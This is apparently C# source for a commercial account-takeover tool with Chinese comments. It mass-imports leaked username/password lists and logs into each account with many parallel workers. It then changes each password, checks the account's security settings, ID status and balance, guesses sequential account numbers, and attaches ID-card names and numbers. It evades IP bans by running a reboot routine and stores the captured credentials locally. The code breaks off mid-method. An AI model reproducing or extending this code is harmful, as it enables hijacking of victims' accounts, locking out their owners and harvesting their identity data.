using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
using System.Xml;
using CommonQ;
using System.Net;
using System.Text.RegularExpressions;
using Newtonsoft.Json.Linq;
using System.Security.Cryptography;
using Noesis.Javascript;
using System.Data.SQLite;
using System.Data;
using System.ComponentModel;
using System.IO.Compression;
using System.Threading;
using System.Diagnostics;

namespace PwcTool
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {

        CLogger m_logger;
        Random m_rgen = new Random(System.Environment.TickCount);

        SQLiteConnection m_pwcconn = new SQLiteConnection();
        DataSet m_pwcdataset = new DataSet();
        SQLiteConnection m_cseconn = new SQLiteConnection();
        DataSet m_csedataset = new DataSet();
        SQLiteConnection m_guessconn = new SQLiteConnection();
        DataSet m_guessdataset = new DataSet();
        SQLiteConnection m_cardconn = new SQLiteConnection();
        DataSet m_carddataset = new DataSet();

        const string lgxml = "lg.xml";
        const string pwxml = "pw.xml";
        const string uidtxt = "uid.txt";
        const string md5js = "cstc.js";
        const string pwcdb = "uid.db";
        const string csedb = "uid.db";
        const string guessdb = "uid.db";
        const string carddb = "uid.db";

        static public string captchadb = "captcha";

        const string pwcuidtable = "uidlogin";
        const string column_uid = "uid";
        const string column_password = "password";
        const string column_status = "status";

        const string cse_uidtable = "uidlogin_checksafe";
        const string cse_column_uid = "uid";
        const string cse_column_password = "password";
        const string cse_column_status = "status";
        const string cse_column_se_mailbox = "mailbox";//密保邮箱
        const string cse_column_se_issue = "issue";//密保问题
        const string cse_column_se_idcard = "idcard";//实名认证
        const string cse_column_se_balance = "balance";//账户余额
        //const string cse_column_se_jifen = "jifen"; //积分
        const string cse_column_se_safepoint = "safepoint";


        const string guess_uidtable = "guess_uid";
        const string guess_column_uid = "uid";
        const string guess_column_password = "password";
        const string guess_column_status = "status";
        const string guess_column_se_mailbox = "mailbox";//密保邮箱
        const string guess_column_se_issue = "issue";//密保问题
        const string guess_column_se_idcard = "idcard";//实名认证
        const string guess_column_se_balance = "balance";//账户余额
        const string guess_column_se_jifen = "jifen"; //积分

        const string card_uidtable = "card_uid";
        const string card_column_uid = "uid";
        const string card_column_password = "password";
        const string card_column_status = "status";
        const string card_column_cardname = "cardname";//身份证名字
        const string card_column_cardid = "cardid";    //身份证号码

        const string status_ready = "准备";
        const string status_pwderror = "密码错误";
        const string status_ok = "成功";

        string[] queryResult = new string[] { "查询异常", "无证", "有证" };

        string m_safekey = "";
        string m_safedbpwd = "";
        string m_safelg = "";
        string m_safepw = "";
        string m_constkey = "0xab3aff";

        int m_userlvl = 0;

        Dictionary<string, string> m_lgcaptcha = new Dictionary<string, string>();
        Dictionary<string, string> m_pwcaptcha = new Dictionary<string, string>();

        string m_fixpwd = "";
        string m_randompwd = "";
        int m_randomnum = 0;

        bool m_bofirststart = true;

        Thread m_saveThread;
        List<object> m_saveObjList = new List<object>();
        List<object> m_saveSeObjList = new List<object>();
        List<object> m_saveGuessObjList = new List<object>();
        List<object> m_saveCardObjList = new List<object>();
        bool m_boshutdwon;

        UidBackup m_uidbacker = new UidBackup();

        List<CpWorker> m_cpworkers = new List<CpWorker>();
        List<SeWorker> m_seworkers = new List<SeWorker>();
        List<GuessWorker> m_guessWorkers = new List<GuessWorker>();
        List<CardWorker> m_cardwokers = new List<CardWorker>();

        Dictionary<string, int> m_uid2idx = new Dictionary<string, int>();

        int m_walkiterator = 0;
        int m_csewalkiterator = 0;
        int m_cardwalkiterator = 0;

        int m_IpToken = 0;

        string m_GuessAccountPrefix;
        Int64 m_GuessBeginValue = 0;
        int m_GuessSet = 0;
        int m_numberOfDigit = 0;
        int m_countOfGuess = 0;
        int m_countOfGuessOk = 0;

        public MainWindow()
        {
            InitializeComponent();

            try
            {
                System.Net.ServicePointManager.DefaultConnectionLimit = 512 * 8;

                m_safekey = RandomString.Next(8, "1-9A-Za-z");

                login dlg = new login();
                dlg.m_safekey = m_safekey;
                dlg.ShowDialog();
                string account = dlg.tbxUid.Text;
                m_safelg = dlg.m_lg;
                m_safepw = dlg.m_pw;
                m_safedbpwd = dlg.m_dbpwd;
                m_userlvl = dlg.userlvl;
                if (String.IsNullOrEmpty(account)
                    || String.IsNullOrEmpty(m_safedbpwd))
                {
                    Environment.Exit(0);
                }

                this.Title = this.Title + " v" + App.version + "." + App.subversion;
                if (!String.IsNullOrEmpty(dlg.deadline_date))
                {
                    this.Title = this.Title + " 到期时间[" + dlg.deadline_date + "]";
                }

            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
                Environment.Exit(0);
            }

            m_logger = CLogger.FromFolder("pwclog");
            m_saveThread = new Thread(new ThreadStart(SaveUidPwdStatus));
            m_saveThread.Start();

            InitPwcDb();
            InitCheckSafeDb();
            InitGuess();
            InitCardSubmit();
        }

        //初始化修密 相关
        void InitPwcDb()
        {
            try
            {
                if (!File.Exists(pwcdb))
                {
                    System.Data.SQLite.SQLiteConnection.CreateFile(pwcdb);
                }
                SQLiteConnectionStringBuilder connstr = new SQLiteConnectionStringBuilder();
                connstr.DataSource = pwcdb;
                m_pwcconn.ConnectionString = connstr.ToString();
                m_pwcconn.Open();

                using (SQLiteCommand cmd = new SQLiteCommand(m_pwcconn))
                {
                    cmd.CommandText = "select count(*) from sqlite_master where type = 'table' and name = '" + pwcuidtable + "'";
                    Int64 result = (Int64)cmd.ExecuteScalar();
                    if (result == 0)
                    {
                        cmd.CommandText = "CREATE TABLE " + pwcuidtable + "(uid varchar(20) primary key,password varchar(20),status varchar(30))";
                        cmd.ExecuteNonQuery();
                    }

                    cmd.CommandText = "select * from " + pwcuidtable;
                    cmd.CommandType = CommandType.Text;

                    SQLiteDataAdapter da = new SQLiteDataAdapter(cmd);
                    da.Fill(m_pwcdataset);
                    UidGrid.ItemsSource = m_pwcdataset.Tables[0].DefaultView;
                    UidGrid.LoadingRow += new EventHandler<DataGridRowEventArgs>(dataGrid_LoadingRow);

                    for (int i = 0; i < m_pwcdataset.Tables[0].Rows.Count; ++i)
                    {
                        m_uid2idx.Add(m_pwcdataset.Tables[0].Rows[i][column_uid].ToString().ToLower(), i);
                    }
                }
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            } 
        }

        //初始化密保 相关
        void InitCheckSafeDb()
        {
            try
            {
                if (!File.Exists(csedb))
                {
                    System.Data.SQLite.SQLiteConnection.CreateFile(csedb);
                }
                SQLiteConnectionStringBuilder connstr = new SQLiteConnectionStringBuilder();
                connstr.DataSource = pwcdb;
                m_cseconn.ConnectionString = connstr.ToString();
                m_cseconn.Open();

                using (SQLiteCommand cmd = new SQLiteCommand(m_cseconn))
                {
                    cmd.CommandText = "select count(*) from sqlite_master where type = 'table' and name = '" + cse_uidtable + "'";
                    Int64 result = (Int64)cmd.ExecuteScalar();
                    if (result == 0)
                    {
                        cmd.CommandText = "CREATE TABLE " + cse_uidtable + "(uid varchar(30) primary key,password varchar(50),status varchar(50),idcard varchar(50),safepoint integer,balance integer)";
                        cmd.ExecuteNonQuery();
                    }

                    cmd.CommandText = "select * from " + cse_uidtable;
                    cmd.CommandType = CommandType.Text;

                    SQLiteDataAdapter da = new SQLiteDataAdapter(cmd);
                    da.Fill(m_csedataset);
                    CheckUidSafeGrid.ItemsSource = m_csedataset.Tables[0].DefaultView;
                    CheckUidSafeGrid.LoadingRow += new EventHandler<DataGridRowEventArgs>(dataGrid_LoadingRow);
                }
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        //初始化 猜号
        void InitGuess()
        {
            try
            {
                if (!File.Exists(guessdb))
                {
                    System.Data.SQLite.SQLiteConnection.CreateFile(guessdb);
                }
                SQLiteConnectionStringBuilder connstr = new SQLiteConnectionStringBuilder();
                connstr.DataSource = guessdb;
                m_guessconn.ConnectionString = connstr.ToString();
                m_guessconn.Open();
                using (SQLiteCommand cmd = new SQLiteCommand(m_guessconn))
                {
                    cmd.CommandText = "select count(*) from sqlite_master where type = 'table' and name = '" + guess_uidtable + "'";
                    Int64 result = (Int64)cmd.ExecuteScalar();
                    if (result == 0)
                    {
                        cmd.CommandText = "CREATE TABLE " + guess_uidtable + "(uid varchar(30) primary key,password varchar(50),status varchar(50),idcard varchar(50),jifen integer,balance integer)";
                        cmd.ExecuteNonQuery();
                    }

                    cmd.CommandText = "select * from " + guess_uidtable;
                    cmd.CommandType = CommandType.Text;

                    SQLiteDataAdapter da = new SQLiteDataAdapter(cmd);
                    da.Fill(m_guessdataset);

                    GuessUidGrid.AutoGenerateColumns = true;
                    GuessUidGrid.ItemsSource = m_guessdataset.Tables[0].DefaultView;
                    GuessUidGrid.LoadingRow += new EventHandler<DataGridRowEventArgs>(dataGrid_LoadingRow);
                }
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        //初始化 上证
        void InitCardSubmit()
        {
            try
            {
                if (!File.Exists(carddb))
                {
                    System.Data.SQLite.SQLiteConnection.CreateFile(carddb);
                }
                SQLiteConnectionStringBuilder connstr = new SQLiteConnectionStringBuilder();
                connstr.DataSource = carddb;
                m_cardconn.ConnectionString = connstr.ToString();
                m_cardconn.Open();
                using (SQLiteCommand cmd = new SQLiteCommand(m_cardconn))
                {
                    cmd.CommandText = "select count(*) from sqlite_master where type = 'table' and name = '" + card_uidtable + "'";
                    Int64 result = (Int64)cmd.ExecuteScalar();
                    if (result == 0)
                    {
                        cmd.CommandText = "CREATE TABLE " + card_uidtable + "(uid varchar(30) primary key,password varchar(50),status varchar(50),cardname varchar(50),cardid varchar(50))";
                        cmd.ExecuteNonQuery();
                    }

                    cmd.CommandText = "select * from " + card_uidtable;
                    cmd.CommandType = CommandType.Text;

                    SQLiteDataAdapter da = new SQLiteDataAdapter(cmd);
                    da.Fill(m_carddataset);

                    CardUidGrid.AutoGenerateColumns = true;
                    CardUidGrid.ItemsSource = m_carddataset.Tables[0].DefaultView;
                    CardUidGrid.LoadingRow += new EventHandler<DataGridRowEventArgs>(dataGrid_LoadingRow);
                }
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void btnStartChangePwd_Click(object sender, RoutedEventArgs e)
        {
            if (String.IsNullOrEmpty(RandomPwdTextbox.Text)
                && String.IsNullOrEmpty(FixPwdTextbox.Text))
            {
                MessageBox.Show("请先设置随机密码或者固定密码!", "", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (!String.IsNullOrEmpty(RandomPwdTextbox.Text))
            {
                m_randompwd = RandomPwdTextbox.Text;
                m_randomnum = int.Parse(tbxPwdNum.Text);
            }
            else
            {
                m_fixpwd = FixPwdTextbox.Text;
            }

            if (!File.Exists(md5js))
            {
                MessageBox.Show(lgxml + "文件不存在", "", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (m_bofirststart)
            {
                firstStart();
                m_bofirststart = false;
            }

            if (CpWorker.KeepRunTime != 0)
            {
                if (System.Environment.TickCount - CpWorker.StartRunTime > CpWorker.KeepRunTime)
                {
                    if (File.Exists(captchadb))
                    {
                        File.Delete(captchadb);
                    }
                    m_lgcaptcha.Clear();
                    m_pwcaptcha.Clear();

                    for (int i = 0; i < m_cpworkers.Count; ++i)
                    {
                        m_cpworkers[i].m_lgcaptcha.Clear();
                        m_cpworkers[i].m_pwcaptcha.Clear();
                    }
                    MessageBox.Show("试用到期了!!");
                    return;
                }
            }

            int num = int.Parse(tbxWorkerNumber.Text);
            for (int i = 0; i < num; ++i)
            {
                if (m_cpworkers.Count <= i)
                {
                    CpWorker worker = new CpWorker(m_lgcaptcha, m_pwcaptcha, m_safekey);
                    worker.FinishTask += new Action<CpWorker, string, string, string, string>(worker_FinishTask);
                    m_cpworkers.Add(worker);
                }

                DataRow nextuidrow = IteratorNextRow(m_pwcdataset.Tables[0],column_status,ref m_walkiterator);
                if (nextuidrow != null)
                {
                    string uid = (string)nextuidrow[column_uid];
                    string pwd = (string)nextuidrow[column_password];
                    string newpwd = this.GetNewPassword();
                    m_cpworkers[i].BeginTaskChangePwd(uid.ToLower().Trim(), pwd.Trim(), newpwd, m_IpToken);
                    nextuidrow[column_status] = status_ready;

                    //m_logger.Debug("begin uid:" + uid + " pwd:" + pwd + " newpwd:" + newpwd);
                }
                else
                {
                    m_cpworkers[i].IsWorking = false;
                }
            }

            RandomPwdTextbox.IsEnabled = false;
            FixPwdTextbox.IsEnabled = false;
            tbxWorkerNumber.IsEnabled = false;
            tbxPwdNum.IsEnabled = false;

            btnStart.IsEnabled = false;
            btnStop.IsEnabled = true;

            CheckCpWorkerStatus();
        }

        private void OnFixPwdKeyDownHandler(object sender, KeyEventArgs e)
        {
            if (RandomPwdTextbox.Text != "")
            {
                RandomPwdTextbox.Text = "";
            }
        }

        private void OnRandomPwdKeyDownHandler(object sender, KeyEventArgs e)
        {
            if (FixPwdTextbox.Text != "")
            {
                FixPwdTextbox.Text = "";
            }
        }

        private DataRow IteratorNextRow(DataTable table ,string columnn,ref int iterator)
        {
            for (; iterator != table.Rows.Count; iterator++)
            {
                string status = table.Rows[iterator][columnn] == null ? ""
                    : table.Rows[iterator][columnn] as string;
                if (String.IsNullOrEmpty(status))
                {
                    return table.Rows[iterator++];
                }
            }
            return null;
        }

        private string GetNewPassword()
        {
            if (!String.IsNullOrEmpty(m_randompwd))
            {
                return RandomString.Next(m_randomnum, m_randompwd);
            }
            else
            {
                return m_fixpwd;
            }
        }

        void worker_FinishTask(CpWorker cpwoker, string uid, string pwd, string newpwd, string result)
        {
            //Dispatcher.BeginInvoke(new Action<CpWorker, string, string, string, string>(worker_FinishTask_Safe),System.Windows.Threading.DispatcherPriority.Background, cpwoker, uid, pwd, newpwd, result);
            BackgroundWorker worker = new BackgroundWorker();
            worker.DoWork += new DoWorkEventHandler(worker_DoWork);
            worker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(worker_RunWorkerCompleted);
            worker.RunWorkerAsync(new Tuple<CpWorker, string, string, string, string>(cpwoker, uid, pwd, newpwd, result));
        }

        void worker_DoWork(object sender, DoWorkEventArgs e)
        {
            int begintick = System.Environment.TickCount;
            var arg = e.Argument as Tuple<CpWorker, string, string, string, string>;
            CpWorker cpworker = arg.Item1;
            string uid = arg.Item2;
            string pwd = arg.Item3;
            string newpwd = arg.Item4;
            string result = arg.Item5;

            string nowpwd = pwd;
            if (result == "成功")
            {
                nowpwd = newpwd;
                m_uidbacker.PushUid(uid, nowpwd, pwd, "cp");
            }

            lock (m_saveObjList)
            {
                m_saveObjList.Add(new Tuple<string, string, string>(uid, nowpwd, result));
            }

            //m_logger.Debug("add update:" + (System.Environment.TickCount - begintick) + "ms");

            e.Result = new Tuple<CpWorker, string, string, string>(cpworker, uid, nowpwd, result);
        }

        void SaveUidPwdStatus()
        {
            while (true)
            {
                if (m_boshutdwon)
                {
                    lock (m_saveObjList)
                    {
                        lock (m_saveSeObjList)
                        {
                            if (m_saveObjList.Count == 0 && m_saveSeObjList.Count == 0)
                            {
                                return;
                            }
                        }
                    }
                }
                do 
                {
                    List<object> pwcwaitsavelist = new List<object>();
                    lock (m_saveObjList)
                    {
                        if (m_saveObjList.Count > 0)
                        {
                            pwcwaitsavelist = new List<object>(m_saveObjList);
                            m_saveObjList.Clear();
                        }
                    }

                    if (pwcwaitsavelist.Count > 0)
                    {
                        int begintick = System.Environment.TickCount;
                        using (SQLiteTransaction ts = m_pwcconn.BeginTransaction())
                        {
                            for (int i = 0; i < pwcwaitsavelist.Count; ++i)
                            {
                                var tuple = pwcwaitsavelist[i] as Tuple<string, string, string>;
                                string uid = tuple.Item1;
                                string pwd = tuple.Item2;
                                string status = tuple.Item3;

                                using (SQLiteCommand cmd = new SQLiteCommand(m_pwcconn))
                                {
                                    cmd.CommandText = "UPDATE " + pwcuidtable + " SET " + column_status + " = @status , " + column_password + " = @pwd"
                                        + " WHERE " + column_uid + " = @uid  ";

                                    cmd.Parameters.Add(new SQLiteParameter("@status", status));
                                    cmd.Parameters.Add(new SQLiteParameter("@uid", uid));
                                    cmd.Parameters.Add(new SQLiteParameter("@pwd", pwd));

                                    cmd.ExecuteNonQuery();
                                }
                            }
                            ts.Commit();
                        }

                        m_logger.Debug("update pwc count:" + pwcwaitsavelist.Count + " time:" + (System.Environment.TickCount - begintick) + "ms");
                    }
                } while (false);

                do 
                {
                    List<object> csewaitsavelist = new List<object>();
                    lock (m_saveSeObjList)
                    {
                        if (m_saveSeObjList.Count > 0)
                        {
                            csewaitsavelist = new List<object>(m_saveSeObjList);
                            m_saveSeObjList.Clear();
                        }
                    }

                    if (csewaitsavelist.Count > 0)
                    {
                        int begintick = System.Environment.TickCount;
                        using (SQLiteTransaction ts = m_cseconn.BeginTransaction())
                        {
                            for (int i = 0; i < csewaitsavelist.Count; ++i)
                            {
                                var tuple = csewaitsavelist[i] as Tuple<SeWorker, string, string, string, int, int, int>;
                                SeWorker seworker = tuple.Item1;
                                string uid = tuple.Item2;
                                string pwd = tuple.Item3;
                                string status = tuple.Item4;
                                int has_idcard = tuple.Item5;
                                int yue = tuple.Item6;
                                int safepoint = tuple.Item7;

                                if (status == "查询成功")
                                {
                                    using (SQLiteCommand cmd = new SQLiteCommand(m_cseconn))
                                    {
                                        cmd.CommandText = "UPDATE " + cse_uidtable + " SET " + cse_column_status + " = @status , " + cse_column_password + " = @pwd ,"
                                            + cse_column_se_idcard + " = @idcard, " + cse_column_se_safepoint + " = @safepoint," + cse_column_se_balance + " =@balance "
                                            + " WHERE " + column_uid + " = @uid  ";

                                        cmd.Parameters.Add(new SQLiteParameter("@status", status));
                                        cmd.Parameters.Add(new SQLiteParameter("@uid", uid));
                                        cmd.Parameters.Add(new SQLiteParameter("@pwd", pwd));
                                        cmd.Parameters.Add(new SQLiteParameter("@idcard", queryResult[has_idcard]));
                                        cmd.Parameters.Add(new SQLiteParameter("@safepoint", safepoint));
                                        cmd.Parameters.Add(new SQLiteParameter("@balance", yue));

                                        cmd.ExecuteNonQuery();
                                    }

                                }
                                else
                                {
                                    using (SQLiteCommand cmd = new SQLiteCommand(m_cseconn))
                                    {
                                        cmd.CommandText = "UPDATE " + cse_uidtable + " SET " + cse_column_status + " = @status  "
                                            + " WHERE " + column_uid + " = @uid  ";

                                        cmd.Parameters.Add(new SQLiteParameter("@status", status));
                                        cmd.Parameters.Add(new SQLiteParameter("@uid", uid));
                                        cmd.ExecuteNonQuery();
                                    }
                                }
                            }
                            ts.Commit();
                        }

                        m_logger.Debug("update cse count:" + csewaitsavelist.Count + " time:" + (System.Environment.TickCount - begintick) + "ms");
                    }
                } while (false);


                do 
                {
                    List<object> guesswaitsavelist = new List<object>();
                    lock (m_saveGuessObjList)
                    {
                        if (m_saveGuessObjList.Count > 0)
                        {
                            guesswaitsavelist = new List<object>(m_saveGuessObjList);
                            m_saveGuessObjList.Clear();
                        }
                    }

                    try
                    {
                        if (guesswaitsavelist.Count > 0)
                        {
                            using (SQLiteTransaction ts = m_guessconn.BeginTransaction())
                            {
                                for (int i = 0; i < guesswaitsavelist.Count; ++i)
                                {
                                    var tuple = guesswaitsavelist[i] as Tuple<GuessWorker, string, string, string, int, int, int>;
                                    //GuessWorker seworker = tuple.Item1;
                                    string uid = tuple.Item2;
                                    string pwd = tuple.Item3;
                                    string status = tuple.Item4;
                                    int has_idcard = tuple.Item5;
                                    int yue = tuple.Item6;
                                    int userpoint = tuple.Item7;

                                    //if (status == "查询成功")
                                    {
                                        using (SQLiteCommand cmd = new SQLiteCommand(m_guessconn))
                                        {
                                            cmd.CommandText = "select * from " + guess_uidtable + " where uid=@uid";
                                            cmd.Parameters.Add(new SQLiteParameter("@uid", uid));
                                            SQLiteDataReader reader = cmd.ExecuteReader();
                                            if (!reader.HasRows)
                                            {
                                                using (SQLiteCommand cmd1 = new SQLiteCommand(m_guessconn))
                                                {
                                                    cmd1.CommandText = "INSERT INTO " + guess_uidtable + " (uid,password,status,idcard,jifen,balance) VALUES(@uid,@pwd,@status,@idcard,@userpoint,@balance)";

                                                    cmd1.Parameters.Add(new SQLiteParameter("@status", status));
                                                    cmd1.Parameters.Add(new SQLiteParameter("@uid", uid));
                                                    cmd1.Parameters.Add(new SQLiteParameter("@pwd", pwd));
                                                    cmd1.Parameters.Add(new SQLiteParameter("@idcard", queryResult[has_idcard]));
                                                    cmd1.Parameters.Add(new SQLiteParameter("@userpoint", userpoint));
                                                    cmd1.Parameters.Add(new SQLiteParameter("@balance", yue));

                                                    cmd1.ExecuteNonQuery();
                                                }
                                            }
                                        }
                                    }
                                }
                                ts.Commit();
                            }
                        }
                    }
                    catch (System.Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                    }
                } while (false);


                do
                {
                    List<object> cardwaitsavelist = new List<object>();
                    lock (m_saveCardObjList)
                    {
                        if (m_saveCardObjList.Count > 0)
                        {
                            cardwaitsavelist = new List<object>(m_saveCardObjList);
                            m_saveObjList.Clear();
                        }
                    }

                    if (cardwaitsavelist.Count > 0)
                    {
                        int begintick = System.Environment.TickCount;
                        using (SQLiteTransaction ts = m_cardconn.BeginTransaction())
                        {
                            for (int i = 0; i < cardwaitsavelist.Count; ++i)
                            {
                                var tuple = cardwaitsavelist[i] as Tuple<CardWorker, string, string, string, string, string>;
                                string uid = tuple.Item2;
                                string pwd = tuple.Item3;
                                string status = tuple.Item4;
                                string cardid = tuple.Item5;
                                string cardname = tuple.Item6;

                                using (SQLiteCommand cmd = new SQLiteCommand(m_cardconn))
                                {
                                    cmd.CommandText = "UPDATE " + card_uidtable + " SET " + card_column_status + " = @status , " + card_column_password + " = @pwd, "
                                        + card_column_cardname + " = @name, " + card_column_cardid + " = @carid"
                                        + " WHERE " + column_uid + " = @uid  ";

                                    cmd.Parameters.Add(new SQLiteParameter("@status", status));
                                    cmd.Parameters.Add(new SQLiteParameter("@uid", uid));
                                    cmd.Parameters.Add(new SQLiteParameter("@pwd", pwd));
                                    cmd.Parameters.Add(new SQLiteParameter("@name", cardname));
                                    cmd.Parameters.Add(new SQLiteParameter("@carid", cardid));

                                    cmd.ExecuteNonQuery();
                                }
                            }
                            ts.Commit();
                        }

                        m_logger.Debug("update pwc count:" + cardwaitsavelist.Count + " time:" + (System.Environment.TickCount - begintick) + "ms");
                    }
                } while (false);

                Thread.Sleep(1000);
            }
        }

        void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            var arg = e.Result as Tuple<CpWorker, string, string, string>;
            CpWorker cpwoker = arg.Item1;
            string uid = arg.Item2;
            string pwd = arg.Item3;
            string result = arg.Item4;

            Dispatcher.BeginInvoke(new Action(() =>
            {
                DataRow targetrow = m_pwcdataset.Tables[0].Rows[m_uid2idx[uid]];
                targetrow[column_password] = pwd;
                targetrow[column_status] = result;

                if (result == "IP被封")
                {
                    if (cpwoker.IpToken == m_IpToken)
                    {
                        if (File.Exists("RebootRoutine.exe"))
                        {
                            m_logger.Debug("启动RebootRoutine.exe...");
                            Process pro= Process.Start("RebootRoutine.exe");
                            pro.WaitForExit();
                            m_logger.Debug("RebootRoutine 退出!!");
                        }
                        m_IpToken++;
                    }
                }

                try
                {
                    if (CpWorker.KeepRunTime != 0 && btnStop.IsEnabled)
                    {
                        if (System.Environment.TickCount - CpWorker.StartRunTime > CpWorker.KeepRunTime)
                        {
                            btnStop.IsEnabled = false;
                            MessageBox.Show("试用时间到了!!");
                        }
                    }

                    if (btnStop.IsEnabled == true)
                    {
                        //if (result == "IP被封")
                        //{
                        //    cpwoker.BeginTaskChangePwd(uid, pwd, GetNewPassword(), m_IpToken);
                        //    targetrow[column_status] = status_ready;
                        //}
                        //else
                        {
                            DataRow nextuidrow = IteratorNextRow(m_pwcdataset.Tables[0], column_status, ref m_walkiterator);
                            if (nextuidrow != null)
                            {
                                string nextuid = (string)nextuidrow[column_uid];
                                string nextpwd = (string)nextuidrow[column_password];
                                string nextnewpwd = this.GetNewPassword();
                                cpwoker.BeginTaskChangePwd(nextuid.ToLower().Trim(), nextpwd.Trim(), nextnewpwd, m_IpToken);
                                nextuidrow[column_status] = status_ready;
                            }
                            else
                            {
                                cpwoker.IsWorking = false;
                                CheckCpWorkerStatus();
                            }
                        }
                    }
                    else
                    {
                        cpwoker.IsWorking = false;
                        CheckCpWorkerStatus();
                    }
                
                }
                catch (System.Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }));
        }

        void CheckCpWorkerStatus()
        {
            foreach (CpWorker w in m_cpworkers)
            {
                if (w.IsWorking == true)
                {
                    return;
                }
            }
            btnStart.IsEnabled = true;
            btnStop.IsEnabled = true;
            tbxWorkerNumber.IsEnabled = true;
            RandomPwdTextbox.IsEnabled = true;
            FixPwdTextbox.IsEnabled = true;
            tbxPwdNum.IsEnabled = true;
        }

        void load_captcha_xml(string xmlfile,Dictionary<string, string> dic)
        {
            XmlDocument doc = new XmlDocument();
            doc.Load(xmlfile);

            XmlNode root = doc.SelectSingleNode("Data");

            for (XmlNode item = root.FirstChild; item != null; item = item.NextSibling)
            {
                if (item.Attributes["name"] != null
                     && item.Attributes["value"] != null)
                {
                    dic.Add(item.Attributes["name"].Value, item.Attributes["value"].Value);
                }
            }
        }

        void load_captcha_from_safetxt(string safe_str, string key, Dictionary<string, string> dic)
        {
            if (!String.IsNullOrEmpty(safe_str))
            {
                string src_txt = MyDes.Decode(safe_str, key);
                string[] split = src_txt.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
                if (split.Length > 0)
                {
                    foreach (string s in split)
                    {
                        string pattern = @"(\w+)=(\w+)";
                        Match mt = Regex.Match(s, pattern);
                        if (mt.Groups.Count == 3)
                        {
                            dic.Add(mt.Groups[1].ToString(), mt.Groups[2].ToString());
                        }
                    }
                }
            }
        }

        void save_captcha_db_from_dic(Dictionary<string, string> dic,string dbpwd,string tablename)
        {
            if (!File.Exists(captchadb))
            {
                System.Data.SQLite.SQLiteConnection.CreateFile(captchadb);
            }
            SQLiteConnectionStringBuilder connstr = new SQLiteConnectionStringBuilder();
            connstr.DataSource = captchadb;
            SQLiteConnection captcha_dbconn = new SQLiteConnection();
            captcha_dbconn.ConnectionString = connstr.ToString();
            captcha_dbconn.SetPassword(dbpwd);
            captcha_dbconn.Open();

            using (SQLiteCommand cmd = new SQLiteCommand(captcha_dbconn))
            {
                cmd.CommandText = "select count(*) from sqlite_master where type = 'table' and name = '" + tablename + "'";
                Int64 result = (Int64)cmd.ExecuteScalar();
                if (result == 0)
                {
                    cmd.CommandText = "CREATE TABLE " + tablename + "(name varchar(50) primary key,value varchar(20))";
                    cmd.ExecuteNonQuery();
                }
            }

            using (SQLiteTransaction ts = captcha_dbconn.BeginTransaction())
            {
                using (SQLiteCommand cmd = new SQLiteCommand(captcha_dbconn))
                {
                    foreach (string name in dic.Keys)
                    {
                        string value = dic[name];

                        cmd.CommandText = "INSERT INTO " + tablename + " (name , value) VALUES(@name,@value)";

                        cmd.Parameters.Clear();
                        cmd.Parameters.Add(new SQLiteParameter("@name", name));
                        cmd.Parameters.Add(new SQLiteParameter("@value", value));

                        cmd.ExecuteNonQuery();

                    }
                }
                ts.Commit();
            }

            captcha_dbconn.Close();
        }

        void load_captcha_from_db(Dictionary<string, string> dic,string dbpwd,string tablename)
        {
            if (!File.Exists(captchadb))
            {
                return;
            }
            SQLiteConnectionStringBuilder connstr = new SQLiteConnectionStringBuilder();
            connstr.DataSource = captchadb;
            SQLiteConnection captcha_dbconn = new SQLiteConnection();
            captcha_dbconn.ConnectionString = connstr.ToString();
            captcha_dbconn.SetPassword(dbpwd);
            captcha_dbconn.Open();

            using (SQLiteCommand cmd = new SQLiteCommand(captcha_dbconn))
            {
                cmd.CommandText = "SELECT name,value FROM " + tablename;

                cmd.CommandType = CommandType.Text;

                SQLiteDataAdapter da = new SQLiteDataAdapter(cmd);
                DataSet tmpdataset = new DataSet();
                da.Fill(tmpdataset);

                if (tmpdataset.Tables[0].Rows.Count > 0)
                {
                    dic.Clear();
                    foreach (DataRow row in tmpdataset.Tables[0].Rows)
                    {
                        dic.Add(row["name"].ToString(), row["value"].ToString());
                    }
                }
            }

            captcha_dbconn.Close();
        }

        void load_uidtxt(string uidtxt)
        {
            try
            {
                if (File.Exists(uidtxt))
                {
                    using (SQLiteCommand cmd = new SQLiteCommand(m_pwcconn))
                    {
                        m_uid2idx.Clear();
                        m_pwcdataset.Tables[0].Clear();

                        cmd.CommandText = "DELETE FROM " + pwcuidtable;
                        cmd.ExecuteNonQuery();

                        string[] lines = File.ReadAllLines(uidtxt, Encoding.GetEncoding("GB2312"));
                        string pattern = @"[0-9]*[^a-zA-z0-9]*(\w+)[^a-zA-z0-9]*(\w+)";

                        foreach (string line in lines)
                        {
                            Match mt = Regex.Match(line, pattern);
                            if (mt.Groups.Count == 3)
                            {
                                string uid = mt.Groups[1].ToString();
                                string pw = mt.Groups[2].ToString();

                                DataRow newRow = m_pwcdataset.Tables[0].Rows.Add();
                                newRow[column_uid] = uid;
                                newRow[column_password] = pw;

                                if (m_uid2idx.ContainsKey(uid.ToLower()))
                                {
                                    m_uid2idx.Clear();
                                    m_pwcdataset.Tables[0].Clear();
                                    MessageBox.Show("导入的数据中包含了相同的账号:" + uid,"Warming",MessageBoxButton.OK,MessageBoxImage.Warning);
                                }
                                m_uid2idx.Add(uid.ToLower(), m_pwcdataset.Tables[0].Rows.IndexOf(newRow));
                            }
                        }

                        int begintick = System.Environment.TickCount;
                        cmd.CommandText = "SELECT * FROM " + pwcuidtable;
                        SQLiteDataAdapter dataadapter = new SQLiteDataAdapter(cmd);
